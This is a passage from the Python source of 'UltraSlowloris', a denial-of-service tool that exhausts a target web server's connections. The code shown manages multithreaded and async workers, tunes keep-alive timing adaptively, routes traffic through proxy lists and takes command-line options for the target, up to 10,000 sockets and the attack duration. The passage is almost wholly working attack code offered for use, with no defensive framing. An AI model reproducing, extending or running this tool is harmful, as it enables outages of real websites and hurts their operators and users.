            print(f"   Total Errors: {Fore.RED}{stats['errors']:,}{Style.RESET_ALL}")
        
        print(f"\n{Fore.CYAN + Style.BRIGHT}{'='*100}{Style.RESET_ALL}")
        print(f"{Fore.RED}Press Ctrl+C to stop the attack{Style.RESET_ALL}")
    
    def start_attack(self):
        logger.info(f"Starting SLOWLORIS attack against {self.target_host}:{self.target_port}")
        logger.info(f"Configuration: {self.max_connections} connections, {self.threads} sync threads, {self.async_workers} async workers")
        
        if self.proxy_manager:
            logger.info(f" Proxy mode: {len(self.proxy_manager.all_proxies)} proxies loaded")
        
        if hasattr(self, 'user_agents') and self.user_agents:
             logger.info(f" Using {len(self.user_agents)} User-Agents from configuration/file.")
        else:
             logger.warning("No User-Agents found!")

        self.is_running = True
        self.start_time = time.time()
        
        stats_thread = threading.Thread(target=self.stats_monitor, daemon=True)
        stats_thread.start()
        
        logger.info(f"Starting {self.threads} synchronous workers...")
        for i in range(self.threads):
            worker = threading.Thread(target=self.sync_worker, args=(i,), daemon=True)
            worker.start()
            self.worker_threads.append(worker)
            time.sleep(0.01)
        
        logger.info(f" Starting {self.async_workers} asynchronous workers...")
        
        async def run_async_workers():
            tasks = [self.async_worker(i) for i in range(self.async_workers)]
            await asyncio.gather(*tasks)
        
        def run_asyncio_loop():
            try:
                loop = asyncio.new_event_loop()
                asyncio.set_event_loop(loop)
                loop.run_until_complete(run_async_workers())
            except Exception as e:
                logger.error(f" Async loop error: {e}")
        
        async_thread = threading.Thread(target=run_asyncio_loop, daemon=True)
        async_thread.start()
        self.worker_threads.append(async_thread)
        
        logger.info(" All workers started successfully")
        
        try:
            elapsed = 0
            while elapsed < self.duration and self.is_running:
                time.sleep(1)
                elapsed = time.time() - self.start_time
        except KeyboardInterrupt:
            logger.warning("\n  Keyboard interrupt received")
        
        self.stop()
    
    def stop(self):
        if not self.is_running: return
        logger.warning("Stopping attack...")
        self.is_running = False
        logger.info("Waiting for workers to finish...")
        for worker in self.worker_threads:
            worker.join(timeout=5)
        logger.info(" Cleaning up connection pool...")
        self.connection_pool.shutdown()
        self._save_statistics()
        logger.info("Attack stopped successfully")
    
    def _save_statistics(self):
        filename = f"ultra_slowloris_stats_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        try:
            with open(filename, 'w') as f:
                json.dump(self.stats, f, indent=2, default=str)
        except: pass

class AdaptiveController:
    def __init__(self):
        self.base_sleep_time = 15
        self.min_sleep = 5
        self.max_sleep = 60
        self.current_sleep = self.base_sleep_time
        self.performance_window = deque(maxlen=20)
        
    def get_optimal_sleep_time(self, success_rate: float) -> float:
        self.performance_window.append(success_rate)
        if len(self.performance_window) < 5:
            return self.current_sleep
        avg_success = sum(self.performance_window) / len(self.performance_window)
        if avg_success > 0.9:
            self.current_sleep = max(self.min_sleep, self.current_sleep * 0.95)
        elif avg_success < 0.7:
            self.current_sleep = min(self.max_sleep, self.current_sleep * 1.1)
        return self.current_sleep + random.uniform(-1, 1)
    
    def adjust_parameters(self, snapshot):
        pass

def load_proxies_from_file(filepath: str) -> List[Dict]:
    proxies = []
    try:
        with open(filepath, 'r') as f:
            for line in f:
                line = line.strip()
                if not line or line.startswith('#'): continue
                try:
                    if '://' in line:
                        proxy_type, rest = line.split('://', 1)
                        host, port = rest.rsplit(':', 1)
                        proxies.append({'type': proxy_type.lower(), 'host': host, 'port': int(port)})
                    elif line.count(':') >= 2:
                        parts = line.split(':')
                        if len(parts) == 3:
                            proxies.append({'type': parts[2].lower(), 'host': parts[0], 'port': int(parts[1])})
                    else:
                        host, port = line.split(':', 1)
                        proxies.append({'type': 'http', 'host': host, 'port': int(port)})
                except: pass
        return proxies
    except: return []

def signal_handler(signum, frame):
    logger.warning("\n  Interrupt signal received. Stopping attack...")
    sys.exit(0)

def main():
    print(ULTRA_BANNER)
    parser = argparse.ArgumentParser(description='Slowloris Attack Tool')
    parser.add_argument('target', help='Target host (e.g., example.com or https://example.com)')
    parser.add_argument('-p', '--port', type=int, help='Target port')
    parser.add_argument('-s', '--sockets', type=int, default=10000, help='Maximum concurrent connections')
    parser.add_argument('-t', '--threads', type=int, help='Number of sync worker threads')
    parser.add_argument('-a', '--async-workers', type=int, help='Number of async workers')
    parser.add_argument('-d', '--duration', type=int, default=300, help='Attack duration in seconds')
    parser.add_argument('--https', action='store_true', help='Use HTTPS/SSL')
    parser.add_argument('-x', '--proxy-file', help='Path to proxy list file')
    parser.add_argument('--static-ua', action='store_true', help='Use static User-Agent')
    parser.add_argument('--no-adaptive', action='store_true', help='Disable adaptive mode')
    parser.add_argument('-v', '--verbose', action='store_true', help='Verbose output')
    
    args = parser.parse_args()
    signal.signal(signal.SIGINT, signal_handler)
    signal.signal(signal.SIGTERM, signal_handler)
    
    proxies = load_proxies_from_file(args.proxy_file) if args.proxy_file else None
    
    try:
        attack = UltraSlowloris(
            target=args.target,
            port=args.port,
            connections=args.sockets,
            threads=args.threads,
            async_workers=args.async_workers,
            proxies=proxies,
            duration=args.duration,
            use_https=args.https,
            verbose=args.verbose,
            random_ua=not args.static_ua,
            adaptive_mode=not args.no_adaptive
        )
        attack.start_attack()
    except KeyboardInterrupt:
        logger.warning("\nAttack interrupted by user")
        sys.exit(0)
    except Exception as e:
        logger.critical(f"error: {e}", exc_info=True)
        sys.exit(1)

if __name__ == '__main__':
    main()
